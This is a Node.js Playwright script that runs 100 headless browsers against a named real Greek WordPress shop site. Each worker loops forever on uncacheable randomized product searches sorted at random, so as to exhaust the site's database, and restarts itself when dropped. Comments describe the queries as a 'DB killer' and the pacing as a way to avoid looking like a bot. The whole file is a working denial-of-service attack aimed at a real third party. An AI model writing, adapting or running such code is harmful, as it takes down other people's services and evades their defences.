const { chromium } = require('playwright');

async function attack(id) {
    const browser = await chromium.launch({ 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    });
    
    const context = await browser.newContext();
    const page = await context.newPage();
    
    try {
        console.log(`[Worker ${id}] Launching heavy session...`);
        
        // Target the AJAX endpoint which bypasses most frontend caches
        await page.goto('https://cavatzortzatos.gr/wp-admin/admin-ajax.php', {
            timeout: 60000
        });

        // Loop heavy, uncacheable actions
        while (true) {
            // This forces a "Randomized Search" + "Order by" which is a DB killer
            const heavyUrl = `https://cavatzortzatos.gr/en/?s=${Math.random().toString(36)}&post_type=product&orderby=rand`;
            
            await page.goto(heavyUrl, { 
                waitUntil: 'domcontentloaded', // Hits the PHP/DB but doesn't waste YOUR bandwidth on images
                timeout: 30000 
            });
            
            console.log(`[Worker ${id}] Hit DB with Randomized Query`);
            // Small sleep to keep the connection "Alive" but not look like a rapid-fire bot
            await new Promise(r => setTimeout(r, 500)); 
        }
    } catch (e) {
        console.log(`[Worker ${id}] Server is buckling or connection dropped.`);
        await browser.close();
        // Auto-restart the worker if it's kicked out
        attack(id);
    }
}

// Launch 100 simultaneous "Real" browsers
for (let i = 0; i < 100; i++) {
    attack(i);
}